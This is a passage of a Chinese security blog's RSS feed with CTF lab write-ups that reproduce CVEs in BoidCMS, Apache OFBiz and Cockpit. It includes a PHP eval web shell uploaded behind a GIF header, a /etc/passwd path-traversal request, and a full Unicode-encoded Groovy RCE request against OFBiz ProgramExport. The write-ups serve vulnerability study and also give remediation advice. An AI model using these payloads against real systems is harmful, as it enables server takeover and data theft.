class="nx">f&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">etc&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">passwd&lt;/span> &lt;span class="nx">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Host&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">localhost&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Accept&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">Encoding&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">gzip&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">deflate&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">br&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Accept&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">*/*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Accept&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">Language&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">en&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">US&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">0.9&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">en&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">0.8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">User&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">Agent&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Mozilla&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">5.0&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">Windows&lt;/span> &lt;span class="nx">NT&lt;/span> &lt;span class="mf">10.0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">Win64&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">x64&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">AppleWebKit&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">537.36&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">KHTML&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">like&lt;/span> &lt;span class="nx">Gecko&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">Chrome&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">119.0.6045.159&lt;/span> &lt;span class="nx">Safari&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">537.36&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Connection&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">close&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Cache&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">Control&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">max&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">age&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【春秋云境】CVE-2023-38836复现</title><link>http://localhost:1313/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83cve-2023-38836%E5%A4%8D%E7%8E%B0/</link><pubDate>Wed, 17 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83cve-2023-38836%E5%A4%8D%E7%8E%B0/</guid><description>&lt;img src="http://localhost:1313/images/76.webp" alt="Featured image of post 【春秋云境】CVE-2023-38836复现" />&lt;h1 id="0x01-靶标介绍">0x01 靶标介绍&lt;/h1>
&lt;p>BoidCMS v.2.0.0 存在文件上传漏洞，远程攻击者可通过添加 GIF 头部绕过 MIME 类型检查，执行任意代码。&lt;/p>
&lt;h1 id="0x02-影响范围">0x02 影响范围&lt;/h1>
&lt;p>&lt;strong>BoidCMS &amp;lt;=2.0.0&lt;/strong>&lt;/p>
&lt;h1 id="0x03-漏洞复现">0x03 漏洞复现&lt;/h1>
&lt;p>首先来到admin页面，使用bs爆破，得到账号密码&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250917131217.png" alt="image.png">&lt;br>
Media页面可以上传文件，尝试上传文件&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250917132015.png" alt="image.png">&lt;br>
文件类型不被支持，我们先上传一个正常文件&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250917132031.png" alt="image.png">&lt;br>
进行抓包，然后编辑重放&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250917132047.png" alt="image.png">&lt;br>
将文件名更改为php后缀，在文件头下面添加payload&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;lt;?php @eval($_POST[&amp;#39;cmd&amp;#39;]);?&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;?php system(&amp;#34;cat /flag&amp;#34;);?&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250917132113.png" alt="image.png">&lt;br>
刷新可以看到上传成功&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250917132132.png" alt="image.png">&lt;br>
回显得到flag&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250917132148.png" alt="image.png">&lt;/p></description></item><item><title>【春秋云境】CVE-2024-36104复现</title><link>http://localhost:1313/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83cve-2024-36104%E5%A4%8D%E7%8E%B0/</link><pubDate>Tue, 16 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83cve-2024-36104%E5%A4%8D%E7%8E%B0/</guid><description>&lt;img src="http://localhost:1313/images/74.webp" alt="Featured image of post 【春秋云境】CVE-2024-36104复现" />&lt;h1 id="靶标介绍">靶标介绍：&lt;/h1>
&lt;p>Apache OFBiz 目录遍历致代码执行漏洞，攻击者可构造恶意请求控制服务器。&lt;br>
该平台存在路径遍历漏洞，其成因是未对用户输入的 contextPath 参数进行充分验证。这使得未授权的攻击者能够通过精心构造的恶意请求绕过认证机制，进而访问系统中本应受保护的敏感接口，最终可能引发任意代码执行的严重后果。&lt;/p>
&lt;h1 id="漏洞影响版本">漏洞影响版本&lt;/h1>
&lt;ul>
&lt;li>&lt;strong>受影响版本​&lt;/strong>​：&lt;code>Apache OFBiz &amp;lt; 18.12.14&lt;/code>&lt;/li>
&lt;li>​&lt;strong>​FOFA搜索语法​&lt;/strong>​：&lt;code>app=&amp;quot;Apache_OFBiz&amp;quot;&lt;/code>&lt;/li>
&lt;/ul>
&lt;h1 id="危害">危害&lt;/h1>
&lt;ul>
&lt;li>&lt;strong>未授权访问&lt;/strong>：攻击者无需认证，通过构造恶意请求，可绕过验证机制，访问本应受限的敏感接口，进而获取系统中敏感信息，如用户数据、商业机密等，严重威胁数据的保密性。&lt;/li>
&lt;li>&lt;strong>远程代码执行&lt;/strong>：漏洞允许攻击者利用&lt;code>/webtools/control/ProgramExport&lt;/code>接口的编程导出功能，执行任意 Groovy 代码，从而实现远程代码执行，完全控制受影响的系统，可进行数据篡改、删除、植入恶意软件等操作，对系统的完整性和可用性造成极大破坏。&lt;/li>
&lt;li>&lt;strong>权限提升&lt;/strong>：攻击者可借此漏洞从低权限用户提升至高权限用户，进而执行更广泛的系统操作，对整个系统的安全构成严重威胁。&lt;/li>
&lt;li>&lt;strong>中间人攻击风险&lt;/strong>：攻击者可利用该漏洞篡改系统返回给合法用户的响应内容，实施中间人攻击，进一步获取用户敏感信息或向用户传播恶意内容。&lt;/li>
&lt;li>&lt;strong>大规模攻击风险&lt;/strong>：由于 Apache OFBiz 在电子商务领域的广泛应用，该漏洞的存在使得大量系统面临被攻击的风险，一旦被大规模利用，可能导致众多企业及用户的业务中断、数据泄露等严重后果，影响范围广泛。&lt;/li>
&lt;/ul>
&lt;h1 id="复现">复现&lt;/h1>
&lt;p>访问：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://39.106.48.123:31276/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250916131814.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">正确路径应该加上/accounting/control/main
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250916131841.png" alt="image.png">&lt;br>
这里显示你的ip为被加入到配置文件的相关允许配置参数中，所以显示了500，但是不影响后面操作，直接通过poc拿下。&lt;br>
可以看到一个 ERROR MESSAGE，出现报错，因为是非本地 localhost 启动，Headers 需要包含 &lt;code>Host: localhost&lt;/code>，所以把 Host 改为：localhost:port&lt;/p>
&lt;h2 id="poc">POC&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">POST&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="n">webtools&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">control&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">forgotPassword&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">ProgramExport&lt;/span> &lt;span class="n">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">localhost&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">31276&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Cookie&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">OFBiz&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Visitor&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">10002&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">User&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Agent&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Mozilla&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">5.0&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">Windows&lt;/span> &lt;span class="n">NT&lt;/span> &lt;span class="mf">10.0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">Win64&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">x64&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">rv&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mf">142.0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">Gecko&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">20100101&lt;/span> &lt;span class="n">Firefox&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">142.0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">text&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">html&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">application&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">xhtml&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">xml&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">application&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">xml&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">q&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mf">0.9&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">*/*&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">q&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mf">0.8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Language&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">zh&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">CN&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">zh&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">q&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mf">0.8&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">zh&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">TW&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">q&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mf">0.7&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">zh&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">HK&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">q&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mf">0.5&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">en&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">US&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">q&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mf">0.3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">en&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">q&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mf">0.2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Encoding&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">gzip&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">deflate&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">br&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Upgrade&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Insecure&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Requests&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Sec&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Fetch&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Dest&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">document&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Sec&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Fetch&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Mode&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">navigate&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Sec&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Fetch&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Site&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">none&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Sec&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Fetch&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">User&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="err">?&lt;/span>&lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Priority&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">u&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">i&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Te&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">trailers&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Connection&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">keep&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">alive&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Type&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">application&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">www&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">form&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">urlencoded&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Length&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">262&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">groovyProgram&lt;/span>&lt;span class="o">=&lt;/span>\&lt;span class="n">u0074&lt;/span>\&lt;span class="n">u0068&lt;/span>\&lt;span class="n">u0072&lt;/span>\&lt;span class="n">u006F&lt;/span>\&lt;span class="n">u0077&lt;/span>\&lt;span class="n">u0020&lt;/span>\&lt;span class="n">u006E&lt;/span>\&lt;span class="n">u0065&lt;/span>\&lt;span class="n">u0077&lt;/span>\&lt;span class="n">u0020&lt;/span>\&lt;span class="n">u0045&lt;/span>\&lt;span class="n">u0078&lt;/span>\&lt;span class="n">u0063&lt;/span>\&lt;span class="n">u0065&lt;/span>\&lt;span class="n">u0070&lt;/span>\&lt;span class="n">u0074&lt;/span>\&lt;span class="n">u0069&lt;/span>\&lt;span class="n">u006F&lt;/span>\&lt;span class="n">u006E&lt;/span>\&lt;span class="n">u0028&lt;/span>\&lt;span class="n">u0027&lt;/span>\&lt;span class="n">u0069&lt;/span>\&lt;span class="n">u0064&lt;/span>\&lt;span class="n">u0027&lt;/span>\&lt;span class="n">u002E&lt;/span>\&lt;span class="n">u0065&lt;/span>\&lt;span class="n">u0078&lt;/span>\&lt;span class="n">u0065&lt;/span>\&lt;span class="n">u0063&lt;/span>\&lt;span class="n">u0075&lt;/span>\&lt;span class="n">u0074&lt;/span>\&lt;span class="n">u0065&lt;/span>\&lt;span class="n">u0028&lt;/span>\&lt;span class="n">u0029&lt;/span>\&lt;span class="n">u002E&lt;/span>\&lt;span class="n">u0074&lt;/span>\&lt;span class="n">u0065&lt;/span>\&lt;span class="n">u0078&lt;/span>\&lt;span class="n">u0074&lt;/span>\&lt;span class="n">u0029&lt;/span>\&lt;span class="n">u003B&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>得到 id 为 root，说明执行成功&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250916132946.png" alt="image.png">&lt;br>
这里执行的远程命令是&lt;code>throw new Exception('cat /flag'.execute().text);&lt;/code>用于获取flag&lt;br>
同样的 Unicode 编码&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250916133133.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250916133157.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{c95e8bc5-409e-40c9-bd82-b7234b2987fe}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="修复建议">修复建议&lt;/h1>
&lt;ol>
&lt;li>&lt;strong>官方补丁​&lt;/strong>​：升级至Apache OFBiz 18.12.14或更高版本&lt;/li>
&lt;li>​&lt;strong>​临时缓解措施​&lt;/strong>​：
&lt;ul>
&lt;li>禁用&lt;code>webtools&lt;/code>模块的非必要接口。&lt;/li>
&lt;li>配置Web应用防火墙（WAF）拦截包含&lt;code>%2e&lt;/code>或&lt;code>;&lt;/code>的恶意请求。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>​&lt;strong>​输入过滤​&lt;/strong>​：对&lt;code>groovyProgram&lt;/code>参数实施白名单校验，禁止异常字符。&lt;/li>
&lt;/ol></description></item><item><title>【春秋云境】CVE-2023-1313复现</title><link>http://localhost:1313/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83cve-2023-1313%E5%A4%8D%E7%8E%B0/</link><pubDate>Sun, 14 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83cve-2023-1313%E5%A4%8D%E7%8E%B0/</guid><description>&lt;img src="http://localhost:1313/images/73.webp" alt="Featured image of post 【春秋云境】CVE-2023-1313复现" />&lt;h1 id="介绍">介绍&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cockpit在2.4.1版本之前存在任意文件上传漏洞
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PS：通过在浏览器中打开/install来运行安装
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250915161546.png" alt="image.png">&lt;/p>
&lt;h1 id="复现">复现&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">这里尝试弱口令爆破，结果进不去，回头看题目提示：进入/install目录安装后，即可通过admin/admin登陆。
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250915161702.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">这里我们找到文件上传点。上传一句话木马
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250915163043.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
